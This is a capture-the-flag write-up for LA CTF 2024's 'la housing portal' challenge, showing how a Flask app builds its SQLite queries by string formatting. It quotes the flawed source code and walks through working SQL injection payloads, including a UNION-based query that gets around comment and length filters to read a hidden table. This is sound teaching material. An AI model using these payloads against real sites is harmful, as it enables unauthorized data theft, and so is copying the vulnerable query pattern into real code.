# la housing portal

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @f0o_f0o
- 344 solves / 265 points
- Author: r2uwu2
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

**Portal Tips** **Double Dashes ("--")** Please do not use double dashes in any text boxes you complete or emails you send through the portal. The portal will generate an error when it encounters an attempt to insert double dashes into the database that stores information from the portal.

Also, apologies for the very basic styling. Our unpaid LA Housing(tm) RA who we voluntold to do the website that we gave FREE HOUSING for decided to quit - we've charged them a fee for leaving, but we are stuck with this website. Sorry about that.

Please note, we do not condone any actual attacking of websites without permission, even if they explicitly state on their website that their systems are vulnerable.

[la-housing.chall.lac.tf](https://la-housing.chall.lac.tf)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219103950.png)

## Enumeration

**Index page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219104815.png)

In here, we can submit a form that gets a match with other people:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219104936.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219104956.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219105041.png)

When we click the "Get Matches!" button, it'll send a POST request to `/submit` with parameter name `name`, `guests`, `neatness`, `sleep`, and `awake`.

There's not much we can do in here. Let's dig through this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/web/la-housing-portal/serv.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/la-housing-portal)-[2024.02.19|10:51:55(HKT)]
└> file serv.zip     
serv.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/la-housing-portal)-[2024.02.19|10:51:57(HKT)]
└> unzip serv.zip    
Archive:  serv.zip
   creating: serv_zip/
  inflating: serv_zip/data.sql       
  inflating: serv_zip/Dockerfile     
   creating: serv_zip/static/
  inflating: serv_zip/static/weewoo.gif  
  inflating: serv_zip/app.py         
   creating: serv_zip/templates/
  inflating: serv_zip/templates/index.html  
  inflating: serv_zip/templates/results.html  
  inflating: serv_zip/templates/hacker.html  
  inflating: serv_zip/data.sqlite    
```

After reading a little bit of the source code, we have the following findings:

**`serv_zip/app.py`, POST method route `/`:**
```python
import sqlite3
from flask import Flask, render_template, request

app = Flask(__name__)
[...]
@app.route("/submit", methods=["POST"])
def search_roommates():
    data = request.form.copy()

    if len(data) > 6:
        return "Invalid form data", 422
    
    
    for k, v in list(data.items()):
        if v == 'na':
            data.pop(k)
        if (len(k) > 10 or len(v) > 50) and k != "name":
            return "Invalid form data", 422
        if "--" in k or "--" in v or "/*" in k or "/*" in v:
            return render_template("hacker.html")
        
    name = data.pop("name")

    
    roommates = get_matching_roommates(data)
    return render_template("results.html", users = roommates, name=name)

def get_matching_roommates(prefs: dict[str, str]):
    if len(prefs) == 0:
        return []
    query = """
    select * from users where {} LIMIT 25;
    """.format(
        " AND ".join(["{} = '{}'".format(k, v) for k, v in prefs.items()])
    )
    print(query)
    conn = sqlite3.connect('file:data.sqlite?mode=ro', uri=True)
    cursor = conn.cursor()
    cursor.execute(query)
    r = cursor.fetchall()
    cursor.close()
    return r
[...]
```

When less than 6 parameters are submitted, it'll loop through all parameters and filters out unwanted parameter name and value. Then, it connects to the SQLite database and execute the SQL query **WITHOUT prepared statement**, which is **vulnerable to SQL injection**.

**When we submit the form, the SQL query is constructed in this way:**
```sql
select * from users where {} LIMIT 25 WHERE name = 'siunam' AND guests = 'No guests at all' AND neatness = 'Messy is ok' AND sleep = '2am-4am' AND awake = 'noon-2pm';
```

Hmm... But where's the flag?

**In `serv_zip/data.sql`, we can see the structure of the database:**
```sql
[...]
CREATE TABLE flag (
flag text
);
INSERT INTO flag VALUES("lactf{fake_flag}");
[...]
```

As you can see, there's a table called `flag` with column `flag` (datatype `text`), and a data with the real flag is being inserted into the table `flag`.

**Hence, the real flag data is in the table `flag`, column `flag`.**

**But before we exploit the SQL injection vulnerability, let's take a closer look at the filtering:**
```python
[...]
for k, v in list(data.items()):
    if v == 'na':
        data.pop(k)
    if (len(k) > 10 or len(v) > 50) and k != "name":
        return "Invalid form data", 422
    if "--" in k or "--" in v or "/*" in k or "/*" in v:
        return render_template("hacker.html")
[...]
```

Let's break it down!
1. If the parameter's value is `na`, the parameter is removed
2. If the parameter name length is greater than 10, or parameter's value is greater than 50 (Excluding parameter `name`), it returns `Invalid form data`
3. If SQL comment is in the parameter name and parameter's value, it returns template `hacker.html`

Hmm... Looks like we need to exploit the SQL injection vulnerability **WITHOUT SQL comment and with character length limit**.

## Exploitation

**To do so, we first test the SQL injection vulnerability by using a single quote (`'`) in one of those parameters:**
```http
POST /submit HTTP/2
Host: la-housing.chall.lac.tf
Content-Type: application/x-www-form-urlencoded

name=siunam&guests=No+guests+at+all&neatness=Messy+is+ok&sleep=2am-4am&awake='
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219112000.png)

As expected, it respond us with HTTP status `500 Internal Server Error`, which means it's really vulnerable to SQL injection.

**Then, to overcome the comment filter, we can just leave the single quote open, like this:** 
```sql
' OR '1'='1
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219112209.png)

Nice! It doesn't respond HTTP status `500 Internal Server Error`, and we got all the matches!

However, in order to get the flag from table `flag`, we need to leverage something else.

For instance, we can exploit it **with `UNION` clause**, this is call "**Union-based SQL injection**".

First, we need to figure out how many columns in the current table.

**To find out, we can view the database structure in `serv_zip/data.sql`:**
```sql
[...]
CREATE TABLE IF NOT EXISTS "users"
(
    id       integer not null
        constraint users_pk
            primary key autoincrement,
    name     TEXT,
    guests   TEXT,
    neatness text,
    sleep    TEXT    not null,
    awake    text
);
[...]
```

In here, **table `users` has 6 columns**, which are: `id`, `name`, `guests`, `neatness`, `sleep`, and `awake`.

**Then, we can use `UNION` clause to get data from another table, `flag`:**
```sql
' UNION SELECT NULL,NULL,NULL,NULL,NULL,flag FROM flag
```

And... Nope:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219113049.png)

Looks like our parameter's value character length is 54, which exceed the 50 characters limit.

**To overcome this issue, we can change the `NULL` to an integer:** 
```sql
' UNION SELECT 1,2,3,4,5,flag FROM flag
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219113258.png)

Ah yes... We're missing the comment bypass trick!

**So, our final payload is this:**
```sql
' UNION SELECT 1,2,3,4,5,flag FROM flag WHERE ''='
```

The `WHERE` clause will return `true`, because an empty string is always equals to an empty string.

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219113413.png)

- **Flag: `lactf{us3_s4n1t1z3d_1npu7!!!}`**

> Trivia: My teammate solved this challenge with Blind-based SQL injection with conditional responses instead of Union-based SQL injection, pretty cool.

## Conclusion

What we've learned:

1. SQLite Union-based SQL injection with filter bypass